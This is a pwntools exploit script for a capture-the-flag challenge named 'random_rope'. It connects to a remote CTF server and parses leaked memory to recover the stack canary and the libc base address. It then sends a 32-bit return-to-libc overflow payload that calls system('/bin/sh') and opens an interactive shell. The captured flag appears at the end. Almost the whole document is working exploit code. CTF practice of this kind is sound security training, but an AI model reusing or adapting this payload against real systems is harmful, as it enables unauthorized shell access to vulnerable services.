#!/usr/bin/env python3

from pwn import *

chall = './random_rope'
lib = './libc-2.28.so'
# lib = '/lib32/libc-2.31.so'

commands = '''
set follow-fork-mode child
b *vuln+102
b *vuln+127
'''

# r = process(chall)
r = remote('ctf.midnightflag.fr', 9024)
# gdb.attach(r, commands)
elf = ELF(chall)
libc = ELF(lib)

r.recvuntil(' : ')
leaks = r.recvuntil('\n')
leaks = [int(leak.decode('utf-8')) & 0xffffffff for leak in leaks.split(b' ')]
log.info(f'leaks = {[hex(leak) for leak in leaks]}')
canary = leaks[-5]
log.success(f'canary = {hex(canary)}')
stdout = leaks[-4]
log.success(f'stdout = {hex(stdout)}')

libc.address = stdout - libc.sym['_IO_2_1_stdout_']
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh'))
log.info(f'libcbase = {hex(libc.address)}')
log.info(f'system = {hex(system)}')
log.info(f'binsh = {hex(binsh)}')

pld = b'A' * 32
pld += p32(canary)
pld += b'B' * 12
pld += p32(system)
pld += p32(0)
pld += p32(binsh)

r.sendline(pld)
r.interactive()

# MCTF{P13_4nd_45lr_4r3_n0t_4_b1g_d34l_wh3n_u_m4n4g3_t0_l34k_s0m3_m3m0rY}
